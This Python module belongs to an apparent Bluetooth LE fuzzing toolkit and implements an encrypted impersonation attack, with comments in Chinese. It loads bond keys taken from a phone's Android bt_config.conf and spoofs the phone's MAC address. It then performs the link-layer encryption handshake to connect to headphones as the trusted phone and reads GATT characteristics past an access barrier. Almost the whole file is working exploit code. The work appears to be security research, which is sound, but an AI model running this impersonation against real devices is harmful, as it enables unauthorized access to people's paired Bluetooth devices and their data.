#!/usr/bin/env python3
# att-fuzz/roles/impersonation_fuzz.py
"""
模式三驱动:加密冒充 -- 用已收割的 bond 密钥伪装手机(central)直连耳机,
绕过 GATT 0x05 句柄墙(攻击面⑦)。

与 central_fuzz 的区别:连上后主动走 LL_ENC 握手(master 侧),启用 host 侧
AES-CCM,在加密链路上做 GATT 发现/读写。前提:已从手机 bt_config.conf 收割
到耳机侧 LTK(bond keys),且知道手机的 public MAC(冒充其地址)。

LL_ENC 握手序列(BT spec Vol 6 Part B 5.3.3,master=我们):
  1. 我们发 LL_ENC_REQ(明文,opcode 0x03):Rand(8)+EDIV(2)+SKDm(8)+IVm(4),
     全部空口小端序(同 pcap_decrypt 解析序)。
  2. 从机回 LL_ENC_RSP(明文,0x04):SKDs(8)+IVs(4)。
  3. 从机发 LL_START_ENC_REQ(明文,0x05) -- 注意是 slave 发,不是我们发。
  4. 我们 enable_encryption(LTK, SKDm, SKDs, IVm, IVs)。
  5. 我们发 LL_START_ENC_RSP(密文,0x06,我们的 TX counter=0)。
  6. 从机回 LL_START_ENC_RSP(密文,0x06,slave TX counter=0)。
  7. 此后双向所有 data+control PDU 均加密。

设计边界:不调用 cmd_reset(板子复位由主 agent 管)。握手失败抛 ImpersonationError
带清晰上下文。duration=0 一直跑到 Ctrl-C。
"""

import json
import logging
import os
import time
from pathlib import Path

from sniffle.pcap import PcapBleWriter
from sniffle.sniffle_hw import SniffleHW

from core import bt_crypto, bt_keys
from core.att import AttOpcode, read_req
from core.serial_lock import guard as serial_guard
from core.transport import (LinkDrop, SniffleTransport, TransportError,
                            LL_ENC_REQ, LL_ENC_RSP, LL_START_ENC_REQ,
                            LL_START_ENC_RSP)

log = logging.getLogger("att-fuzz.impersonation")

REPO = Path(__file__).resolve().parents[2]

# 握手等待超时(秒):ENC_RSP/START_ENC_REQ/START_ENC_RSP 各等这么久
HANDSHAKE_TIMEOUT = 5.0


class ImpersonationError(Exception):
    """冒充握手失败(带上下文,便于主 agent 排障)。"""


def make_transport(serport, target: dict, outdir: Path) -> SniffleTransport:
    hw = SniffleHW(serport=serport or target.get("serport"))
    pcap = PcapBleWriter(str(outdir / "capture.pcap"))
    return SniffleTransport(hw, pcap=pcap, jsonl_path=outdir / "transport.jsonl",
                            conn_interval_units=target.get("conn_interval", 12))


def run(target: dict, outdir: Path, serport=None,
        bt_keys_path: str | None = None, keys_mac: str | None = None,
        phone_mac: str | None = None, duration: float = 0.0,
        max_cases: int = 0, adb_serial: str | None = None) -> int:
    """加密冒充主入口。duration>0 为运行秒数上限;0 表示一直跑到 Ctrl-C。
    bt_keys_path:Android bt_config.conf 或提取 JSON。
    keys_mac:bt_config 里目标设备(耳机)MAC(书写序)。
    phone_mac:手机 public MAC(书写序) -- 我们冒充这个地址。
    返回 0=正常结束,非 0=出错。"""
    outdir = Path(outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    with serial_guard(serport or target.get("serport"), "CLI impersonation(加密冒充)"):
        return _run_locked(target, outdir, serport, bt_keys_path, keys_mac,
                           phone_mac, duration, max_cases, adb_serial)


def _run_locked(target, outdir, serport, bt_keys_path, keys_mac,
                phone_mac, duration, max_cases, adb_serial) -> int:
    transport = make_transport(serport, target, outdir)
    ledger_path = outdir / "impersonation_ledger.jsonl"
    started = time.time()
    conn_no = 0

    def record(**fields):
        rec = {"ts": round(time.time(), 6), "conn": conn_no}
        rec.update(fields)
        with open(ledger_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")

    # ---- 1. 加载 bond 密钥 ----
    if not bt_keys_path:
        raise ImpersonationError("需要 --bt-keys 指定密钥文件(bt_config.conf 或 JSON)")
    bonds = bt_keys.load_keys(bt_keys_path, target_mac=keys_mac)
    if not bonds:
        raise ImpersonationError("密钥文件里没有可用 bond(目标节未匹配?试试 --keys-mac)")
    # 取第一个有 LTK 的 bond
    bond = next((b for b in bonds if b.ltk), None)
    if bond is None:
        raise ImpersonationError("bond 无 LTK(LE_KEY_PENC 缺失)")
    ltk_wire = bond.ltk   # dump 序;enable_encryption 内部反转
    log.info("bond: %s ltk=%s rand=%s ediv=%s",
             bond.name or bond.section, ltk_wire.hex(),
             bond.rand.hex() if bond.rand else "?",
             bond.ediv.hex() if bond.ediv else "?")
    record(kind="bond_loaded", name=bond.name, section=bond.section,
           ltk=ltk_wire.hex(), key_size=bond.key_size)

    # ---- 2. 设我们的地址 = 手机 public MAC(冒充) ----
    if not phone_mac:
        raise ImpersonationError("需要 --phone-mac 指定手机地址(书写序)以冒充")
    phone_wire, _ = transport._parse_mac(phone_mac)
    log.info("impersonating phone MAC %s (wire %s)", phone_mac, phone_wire.hex())
    record(kind="setaddr", phone_mac=phone_mac, wire=phone_wire.hex())

    try:
        while True:
            if duration and time.time() - started >= duration:
                log.info("duration reached, stopping")
                break
            conn_no += 1
            log.info("=== impersonation connection #%d ===", conn_no)
            record(kind="conn_start", conn=conn_no)
            try:
                _do_one_connection(transport, target, ltk_wire, outdir,
                                   phone_wire, record, duration, started)
            except LinkDrop as drop:
                log.warning("link dropped: %s", drop)
                record(kind="link_drop", source=drop.source,
                       reason=drop.reason)
            except ImpersonationError as e:
                log.error("impersonation failed: %s", e)
                record(kind="impersonation_error", error=str(e))
                # 握手失败:不重试(密钥/地址可能不对,需要人工排查)
                return 1
            except TransportError as e:
                log.error("transport error: %s", e)
                record(kind="transport_error", error=str(e))
                stuck = getattr(e, "stuck", False)
                if stuck:
                    log.error("firmware may be stuck -- needs cmd_reset (main agent)")
                    return 2
                # 干净失败:重试下一次连接
                continue
    except KeyboardInterrupt:
        log.info("interrupted by user")
    finally:
        log.info("impersonation run summary: %d connection attempts", conn_no)
        log.info("ledger: %s", ledger_path)
        log.info("pcap:   %s", outdir / "capture.pcap")
    return 0


def _do_one_connection(transport, target, ltk_wire, outdir, phone_wire,
                        record, duration, started):
    """单次冒充连接:connect -> LL_ENC 握手 -> GATT 发现 -> 几个读。"""
    # ---- 3. 发起连接(冒充手机地址) ----
    log.info("connecting to target %s as %s ...", target.get("mac", "?"),
             phone_wire.hex())
    transport.connect(target, our_addr=phone_wire, our_addr_random=False)
    log.info("connected: aa=%08X", transport.aa or 0)
    record(kind="connected", aa="%08X" % (transport.aa or 0))

    # ---- 4. DLE + MTU(明文阶段,握手前先协商好)----
    transport.setup_data_size()
    log.info("negotiated: ll_max=%d att_mtu=%d", transport.ll_max,
             transport.att_mtu)
    record(kind="data_size", ll_max=transport.ll_max,
           att_mtu=transport.att_mtu)

    # ---- 5. 驱动 LL_ENC 握手 ----
    _drive_enc_handshake(transport, ltk_wire, record)
    log.info("encryption engaged -- link is now encrypted")
    record(kind="enc_engaged")

    # ---- 6. 加密链路 GATT 发现 + 几个读 ----
    _do_encrypted_gatt(transport, target, outdir, record, duration, started)

    # 正常断链
    if transport.link_up:
        try:
            transport.disconnect()
        except Exception as e:
            log.warning("disconnect failed: %s", e)


def _drive_enc_handshake(transport, ltk_wire, record):
    """驱动 LL_ENC 握手(master 侧)。成功后 transport._enc_enabled=True。"""
    import os as _os
    # a. 生成 SKDm(8 随机)+ IVm(4 随机);Rand=0/EDIV=0 匹配 bond
    skdm_wire = _os.urandom(8)
    ivm_wire = _os.urandom(4)
    rand = b"\x00" * 8
    ediv = b"\x00\x00"
    # b. LL_ENC_REQ: opcode + Rand(8) + EDIV(2) + SKDm(8, wire/LE) + IVm(4)
    enc_req = bytes([LL_ENC_REQ]) + rand + ediv + skdm_wire + ivm_wire
    log.info("sending LL_ENC_REQ (skdm=%s ivm=%s)",
             skdm_wire.hex(), ivm_wire.hex())
    record(kind="enc_req_sent", skdm=skdm_wire.hex(), ivm=ivm_wire.hex())
    transport._tx_ll_pdu(3, enc_req)   # 明文(握手前 _enc_enabled=False)

    # c. 等 LL_ENC_RSP(明文,0x04):从 _enc_handshake_q 取
    rsp = _wait_handshake_pdu(transport, LL_ENC_RSP, HANDSHAKE_TIMEOUT)
    if rsp is None:
        raise ImpersonationError("LL_ENC_RSP 超时(从机未回加密握手响应)"
                                 "-- 可能密钥/bond 不匹配或从机不支持加密重连")
    _, enc_rsp_payload = rsp
    if len(enc_rsp_payload) < 13:
        raise ImpersonationError("LL_ENC_RSP 长度不足: %d" % len(enc_rsp_payload))
    skds_wire = enc_rsp_payload[1:9]
    ivs_wire = enc_rsp_payload[9:13]
    log.info("got LL_ENC_RSP (skds=%s ivs=%s)",
             skds_wire.hex(), ivs_wire.hex())
    record(kind="enc_rsp_recv", skds=skds_wire.hex(), ivs=ivs_wire.hex())

    # d. 等 LL_START_ENC_REQ(明文,0x05) -- 从机发送
    start_req = _wait_handshake_pdu(transport, LL_START_ENC_REQ,
                                    HANDSHAKE_TIMEOUT)
    if start_req is None:
        # 有些实现可能跳过 START_ENC_REQ 直接进加密 -- 尝试不报错,
        # 但记录警告(BT spec 要求从机发,实测个别栈可能省略)
        log.warning("未收到 LL_START_ENC_REQ(从机可能省略,按 spec 应发)"
                    " -- 继续 enable_encryption")
        record(kind="start_enc_req_missing")
    else:
        log.info("got LL_START_ENC_REQ (plaintext, slave ready)")
        record(kind="start_enc_req_recv")

    # e. enable_encryption(LTK 反转 + SKD/IV 空口序)
    transport.enable_encryption(ltk_wire, skdm_wire, skds_wire,
                                ivm_wire, ivs_wire)

    # f. 发 LL_START_ENC_RSP(密文,0x06,我们的 TX counter=0)
    log.info("sending LL_START_ENC_RSP (encrypted, our c0)")
    record(kind="start_enc_rsp_sent")
    transport._tx_ll_pdu(3, bytes([LL_START_ENC_RSP]))   # _enc_enabled -> 加密

    # g. 等从机 LL_START_ENC_RSP(密文,0x06) -- recv 路径解密后入队列
    start_rsp = _wait_handshake_pdu(transport, LL_START_ENC_RSP,
                                    HANDSHAKE_TIMEOUT)
    if start_rsp is None:
        raise ImpersonationError("从机 LL_START_ENC_RSP 超时(加密未完成)"
                                 "-- 可能 MIC 校验失败(密钥/字节序错?)")
    log.info("got LL_START_ENC_RSP (encrypted, slave c0) -- encryption engaged")
    record(kind="start_enc_rsp_recv")


def _wait_handshake_pdu(transport, opcode, timeout):
    """从 _enc_handshake_q 取指定 opcode 的 PDU;poll 期间泵串口。
    返回 (opcode, payload) 或 None(超时)。"""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        # 先查队列(可能 _feed_rx_data 已在 _pump 里入队)
        for i, (opc, payload) in enumerate(transport._enc_handshake_q):
            if opc == opcode:
                transport._enc_handshake_q.pop(i)
                return (opc, payload)
        # 泵串口(可能触发 _handle_ll_control 入队)
        try:
            transport.recv_att(timeout=0.1)
        except LinkDrop:
            return None
    # 最后再查一次队列
    for i, (opc, payload) in enumerate(transport._enc_handshake_q):
        if opc == opcode:
            transport._enc_handshake_q.pop(i)
            return (opc, payload)
    return None


def _do_encrypted_gatt(transport, target, outdir, record, duration, started):
    """加密链路上做 GATT 发现 + 几个读,验证 0x05 句柄墙是否消失。"""
    from core.session import FuzzSession

    # 用 FuzzSession 做 GATT 发现(它内部用 transport.inject/recv_att,
    # 加密已启用 -> 自动加密 TX/解密 RX)
    session = FuzzSession(transport, target,
                          gatt_map_path=outdir / "gatt_enc.json",
                          negotiate_mtu=False)   # MTU 已在握手前协商
    # 不调 session.start()(它会 reconnect + setup_data_size);
    # 直接 discover(链路已连已加密)
    from core.gatt_map import discover
    log.info("encrypted GATT discovery ...")
    gatt = discover(transport)
    if session.gatt_map_path:
        gatt.save(session.gatt_map_path)
    log.info("GATT: %d services, %d characteristics",
             len(gatt.services), len(gatt.characteristics))
    record(kind="gatt_discovered", services=len(gatt.services),
           chars=len(gatt.characteristics))
    for s in gatt.services:
        log.info("  service %s [%04X-%04X]", s.uuid, s.start_handle, s.end_handle)
        record(kind="gatt_service", uuid=s.uuid,
               start=s.start_handle, end=s.end_handle)

    # 几个手工读:遍历前 5 个特征值句柄
    read_count = 0
    for ch in gatt.characteristics[:5]:
        if not (ch.props & 0x02):   # 跳过不可读
            continue
        if duration and time.time() - started >= duration:
            break
        handle = ch.value_handle
        log.info("encrypted read handle 0x%04X ...", handle)
        try:
            transport.inject(read_req(handle))
            rsp = transport.recv_att(timeout=transport.response_timeout)
        except LinkDrop as e:
            log.warning("read handle 0x%04X -> link drop: %s", handle, e)
            record(kind="read_drop", handle=handle, error=str(e))
            break
        if rsp is None:
            log.warning("read handle 0x%04X -> no response (encrypted)", handle)
            record(kind="read_timeout", handle=handle)
        else:
            op = rsp.pdu[0]
            log.info("read handle 0x%04X -> op=0x%02X len=%d", handle, op,
                     len(rsp.pdu))
            record(kind="read_ok", handle=handle, op=op,
                   pdu=rsp.pdu.hex()[:64])
            read_count += 1
    log.info("encrypted reads done: %d ok", read_count)
    record(kind="reads_done", count=read_count)
